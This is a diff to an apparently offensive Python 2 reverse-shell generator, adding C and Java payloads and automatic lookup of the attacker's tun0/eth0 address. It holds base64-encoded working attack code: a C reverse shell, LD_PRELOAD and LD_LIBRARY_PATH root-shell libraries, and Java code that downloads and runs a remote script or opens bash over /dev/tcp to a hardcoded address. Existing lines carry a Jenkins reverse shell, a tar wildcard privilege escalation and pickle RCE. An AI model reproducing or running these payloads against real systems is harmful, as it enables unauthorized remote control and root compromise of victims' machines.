@@ -1,6 +1,6 @@
 # !/usr/bin/python
 # coding=utf-8
-import requests,sys,base64,os,pickle
+import requests,sys,base64,os,pickle,socket,fcntl,struct
 from colorama import Fore, Back, Style
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
@@ -25,6 +25,9 @@ LIST_SHELL = {
 	"jenkins" : ["U3RyaW5nIGhvc3Q9IlJFUExBQ0VfSVAiOwppbnQgcG9ydD1SRVBMQUNFX1BPUlQ7ClN0cmluZyBjbWQ9ImNtZC5leGUiOwpQcm9jZXNzIHA9bmV3IFByb2Nlc3NCdWlsZGVyKGNtZCkucmVkaXJlY3RFcnJvclN0cmVhbSh0cnVlKS5zdGFydCgpO1NvY2tldCBzPW5ldyBTb2NrZXQoaG9zdCxwb3J0KTtJbnB1dFN0cmVhbSBwaT1wLmdldElucHV0U3RyZWFtKCkscGU9cC5nZXRFcnJvclN0cmVhbSgpLCBzaT1zLmdldElucHV0U3RyZWFtKCk7T3V0cHV0U3RyZWFtIHBvPXAuZ2V0T3V0cHV0U3RyZWFtKCksc289cy5nZXRPdXRwdXRTdHJlYW0oKTt3aGlsZSghcy5pc0Nsb3NlZCgpKXt3aGlsZShwaS5hdmFpbGFibGUoKT4wKXNvLndyaXRlKHBpLnJlYWQoKSk7d2hpbGUocGUuYXZhaWxhYmxlKCk+MClzby53cml0ZShwZS5yZWFkKCkpO3doaWxlKHNpLmF2YWlsYWJsZSgpPjApcG8ud3JpdGUoc2kucmVhZCgpKTtzby5mbHVzaCgpO3BvLmZsdXNoKCk7VGhyZWFkLnNsZWVwKDUwKTt0cnkge3AuZXhpdFZhbHVlKCk7YnJlYWs7fWNhdGNoIChFeGNlcHRpb24gZSl7fX07cC5kZXN0cm95KCk7cy5jbG9zZSgpOwo="],
 	"tar-priv" : ["dG91Y2ggLS0gIi0tY2hlY2twb2ludD0xIgp0b3VjaCAtLSAiLS1jaGVja3BvaW50LWFjdGlvbj1leGVjPXNoIHNoZWxsLnNoIgplY2hvICJybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyBsb2NhbGhvc3QgNTMgPi90bXAvZiIgPiBzaGVsbC5zaApjaG1vZCA3NzcgLi8iLS1jaGVja3BvaW50PTEiCmNobW9kIDc3NyAuLyItLWNoZWNrcG9pbnQtYWN0aW9uPWV4ZWM9c2ggc2hlbGwuc2giCmNobW9kIDc3NyBzaGVsbC5zaAo="],
 	"pickle" : [],
+	"c" : ["Z2NjIHNoZWxsLmMgLW8gc2hlbGwKCiNpbmNsdWRlIDxzdGRpby5oPgojaW5jbHVkZSA8c3lzL3NvY2tldC5oPgojaW5jbHVkZSA8c3lzL3R5cGVzLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgojaW5jbHVkZSA8bmV0aW5ldC9pbi5oPgojaW5jbHVkZSA8YXJwYS9pbmV0Lmg+CgppbnQgbWFpbih2b2lkKXsKICAgIGludCBwb3J0ID0gUkVQTEFDRV9QT1JUOwogICAgc3RydWN0IHNvY2thZGRyX2luIHJldnNvY2thZGRyOwoKICAgIGludCBzb2NrdCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgMCk7CiAgICByZXZzb2NrYWRkci5zaW5fZmFtaWx5ID0gQUZfSU5FVDsgICAgICAgCiAgICByZXZzb2NrYWRkci5zaW5fcG9ydCA9IGh0b25zKHBvcnQpOwogICAgcmV2c29ja2FkZHIuc2luX2FkZHIuc19hZGRyID0gaW5ldF9hZGRyKCJSRVBMQUNFX0lQIik7CgogICAgY29ubmVjdChzb2NrdCwgKHN0cnVjdCBzb2NrYWRkciAqKSAmcmV2c29ja2FkZHIsIAogICAgc2l6ZW9mKHJldnNvY2thZGRyKSk7CiAgICBkdXAyKHNvY2t0LCAwKTsKICAgIGR1cDIoc29ja3QsIDEpOwogICAgZHVwMihzb2NrdCwgMik7CgogICAgY2hhciAqIGNvbnN0IGFyZ3ZbXSA9IHsiL2Jpbi9zaCIsIE5VTEx9OwogICAgZXhlY3ZlKCIvYmluL3NoIiwgYXJndiwgTlVMTCk7CgogICAgcmV0dXJuIDA7ICAgICAgIAp9Cg==","Z2NjIC1zaGFyZWQgLW8gbGliZ3JlZXRpbmdzLnNvIC1mUElDIGxpYmdyZWV0aW5ncy5jCgojaW5jbHVkZTxzdGRpby5oPgojaW5jbHVkZTxzdGRsaWIuaD4KI2luY2x1ZGU8dW5pc3RkLmg+CmludCBncmVldGluZ3MoKXsKICAgIHNldHVpZCgwKTsKICAgIHNldGdpZCgwKTsKICAgIHN5c3RlbSgiL2Jpbi9iYXNoIik7Cn0K","Z2NjIC1vIGxpYmNyeXB0LnNvLjEgLXNoYXJlZCAtZlBJQyBsaWJyYXJ5X3BhdGguYwoKc3VkbyBMRF9MSUJSQVJZX1BBVEg9L3RtcCBiaW5hcnkKCiNpbmNsdWRlIDxzdGRpby5oPgojaW5jbHVkZSA8c3RkbGliLmg+CgpzdGF0aWMgdm9pZCBoaWphY2soKSBfX2F0dHJpYnV0ZV9fKChjb25zdHJ1Y3RvcikpOwoKdm9pZCBoaWphY2soKSB7Cgl1bnNldGVudigiTERfTElCUkFSWV9QQVRIIik7CglzZXRyZXN1aWQoMCwwLDApOwoJc3lzdGVtKCIvYmluL2Jhc2ggLXAiKTsKfQo=","Z2NjIC1mUElDIC1zaGFyZWQgLW5vc3RhcnRmaWxlcyAtbyBwcmVsb2FkLnNvIHByZWxvYWQuYwoKc3VkbyBMRF9QUkVMT0FEPS90bXAvcHJlbG9hZC5zbyBiaW5hcnkKCiNpbmNsdWRlIDxzdGRpby5oPgojaW5jbHVkZSA8c3lzL3R5cGVzLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KCnZvaWQgX2luaXQoKSB7Cgl1bnNldGVudigiTERfUFJFTE9BRCIpOwoJc2V0cmVzdWlkKDAsMCwwKTsKCXN5c3RlbSgiL2Jpbi9iYXNoIC1wIik7Cn0K"],
+	"java" : ["U2F2ZSBhcyBzaGVsbC5qYXZhID0+IHN1ZG8gamF2YSBzaGVsbC5qYXZhCgppbXBvcnQgamF2YS5pby5CdWZmZXJlZFJlYWRlcjsKaW1wb3J0IGphdmEuaW8uSW5wdXRTdHJlYW1SZWFkZXI7CgpwdWJsaWMgY2xhc3MgdGVzdHByb2cgewogICAgcHVibGljIHN0YXRpYyB2b2lkIG1haW4oU3RyaW5nIGFyZ3NbXSkgewogICAgICAgIFN0cmluZyBzOwogICAgICAgIFByb2Nlc3MgcDsKICAgICAgICB0cnkgewogICAgICAgICAgICBwID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYygid2dldCBodHRwOi8vUkVQTEFDRV9JUC9zaGVsbC5weSAtTyAvdG1wL3NoZWxsLnB5Iik7CiAgICAgICAgICAgIHAud2FpdEZvcigpOwogICAgICAgICAgICBwLmRlc3Ryb3koKTsKICAgICAgICAgICAgcCA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoInB5dGhvbiAvdG1wL3NoZWxsLnB5Iik7CiAgICAgICAgICAgIHAud2FpdEZvcigpOwogICAgICAgICAgICBwLmRlc3Ryb3koKTsKICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gZSkge30KICAgIH0KfQo=","U2F2ZSBhcyBzaGVsbC5qYXZhID0+IHN1ZG8gamF2YSBzaGVsbC5qYXZhCgppbXBvcnQgamF2YS5pby5CdWZmZXJlZFJlYWRlcjsKaW1wb3J0IGphdmEuaW8uSW5wdXRTdHJlYW1SZWFkZXI7CgpwdWJsaWMgY2xhc3MgdGVzdHByb2cgewogICAgcHVibGljIHN0YXRpYyB2b2lkIG1haW4oU3RyaW5nIGFyZ3NbXSkgewogICAgICAgIFN0cmluZyBzOwogICAgICAgIFByb2Nlc3MgcDsKICAgICAgICB0cnkgewogICAgICAgICAgICBwID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYygiYmFzaCAtYyBiYXNoJHtJRlN9LWkke0lGU30+Ji9kZXYvdGNwL1JFUExBQ0VfSVAvUkVQTEFDRV9QT1JUPCYxIik7CiAgICAgICAgICAgIHAud2FpdEZvcigpOwogICAgICAgICAgICBwLmRlc3Ryb3koKTsKICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gZSkge30KICAgIH0KfQo=","U2F2ZSBhcyBzaGVsbC5qYXZhID0+IHN1ZG8gamF2YSBzaGVsbC5qYXZhCgppbXBvcnQgamF2YS5pby5CdWZmZXJlZFJlYWRlcjsKaW1wb3J0IGphdmEuaW8uSW5wdXRTdHJlYW1SZWFkZXI7CgpwdWJsaWMgY2xhc3MgdGVzdHByb2cgewogICAgcHVibGljIHN0YXRpYyB2b2lkIG1haW4oU3RyaW5nIGFyZ3NbXSkgewogICAgICAgIFN0cmluZyBzOwogICAgICAgIFByb2Nlc3MgcDsKICAgICAgICB0cnkgewogICAgICAgICAgICBwID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYygiYmFzaCAtYyAkQHxiYXNoIDAgZWNobyBiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMC4xNDMvOTAwMiAwPiYxIik7CiAgICAgICAgICAgIHAud2FpdEZvcigpOwogICAgICAgICAgICBwLmRlc3Ryb3koKTsKICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gZSkge30KICAgIH0KfQo="],
+
 }
 
 # Header
@@ -57,27 +60,41 @@ def pickle_rce():
 		import os
 		return (os.system,(command,))
 	LIST_SHELL["pickle"].append(base64.b64encode(base64.b64encode(pickle.dumps(rce()))))
+	
+# IP Get Functions
+def get_ip_address(ifname):
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    return socket.inet_ntoa(fcntl.ioctl(
+        s.fileno(),
+        0x8915,  # SIOCGIFADDR
+        struct.pack('256s', ifname[:15])
+    )[20:24])
 
 # Main    	
 if __name__ == "__main__":
 	print header()
 	if len(sys.argv) == 1:
-		print formatHelp("(+) Usage :\t\t python %s <TYPE> <IP> <PORT>" % sys.argv[0])
-		print headercolor("Available Type =>\t python,python3,bash,nc,php,perl,ruby,haskell,\n\t\t\t powershell,nodejs,awk,ncat,exe,ssti,cgi-bin,\n\t\t\t jenkins,tar-priv,pickle")
+		print formatHelp("(+) Usage :\t\t python %s <TYPE> <IP/eth0/tun0> <PORT>" % sys.argv[0])
+		print headercolor("Available Type =>\t python,python3,bash,nc,php,perl,ruby,haskell,\n\t\t\t powershell,nodejs,awk,ncat,exe,ssti,cgi-bin,\n\t\t\t jenkins,tar-priv,pickle,c,java")
 		sys.exit(-1)
 	if len(sys.argv) == 2:
-		print formatHelp("(+) Usage :\t\t python %s <TYPE> <IP> <PORT>" % sys.argv[0])
-		print headercolor("Available Type =>\t python,python3,bash,nc,php,perl,ruby,haskell,\n\t\t\t powershell,nodejs,awk,ncat,exe,ssti,cgi-bin,\n\t\t\t jenkins,tar-priv,pickle")
+		print formatHelp("(+) Usage :\t\t python %s <TYPE> <IP/eth0/tun0> <PORT>" % sys.argv[0])
+		print headercolor("Available Type =>\t python,python3,bash,nc,php,perl,ruby,haskell,\n\t\t\t powershell,nodejs,awk,ncat,exe,ssti,cgi-bin,\n\t\t\t jenkins,tar-priv,pickle,c,java")
 		print formatHelp("\nPlease Specify IP")
 		sys.exit(-1)
 	if len(sys.argv) == 3:
-		print formatHelp("(+) Usage :\t\t python %s <TYPE> <IP> <PORT>" % sys.argv[0])
-		print headercolor("Available Type =>\t python,python3,bash,nc,php,perl,ruby,haskell,\n\t\t\t powershell,nodejs,awk,ncat,exe,ssti,cgi-bin,\n\t\t\t jenkins,tar-priv,pickle")
+		print formatHelp("(+) Usage :\t\t python %s <TYPE> <IP/eth0/tun0> <PORT>" % sys.argv[0])
+		print headercolor("Available Type =>\t python,python3,bash,nc,php,perl,ruby,haskell,\n\t\t\t powershell,nodejs,awk,ncat,exe,ssti,cgi-bin,\n\t\t\t jenkins,tar-priv,pickle,c,java")
 		print formatHelp("\nPlease Specify PORT")
 		sys.exit(-1)
 		
 	OPTIONS = sys.argv[1]
-	IP = sys.argv[2]
+	if sys.argv[2] == "tun0":
+	    IP = get_ip_address('tun0')
+	elif sys.argv[2] == "eth0":
+	    IP = get_ip_address('eth0')
+	else:
+	    IP = sys.argv[2]
 	PORT = sys.argv[3]
 	COUNTER = 0
 	ONLY_BASH =""
